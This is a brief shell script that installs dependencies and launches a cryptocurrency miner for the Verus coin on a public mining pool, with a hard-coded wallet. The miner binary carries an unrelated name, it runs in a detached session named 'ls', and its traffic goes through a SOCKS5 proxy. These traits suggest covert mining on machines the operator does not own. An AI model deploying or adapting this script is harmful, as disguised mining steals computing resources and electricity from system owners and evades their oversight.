sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x DevByNongCroissantV5
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
PROXY=socks5://98.162.25.23:4145
./DevByNongCroissantV5 -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
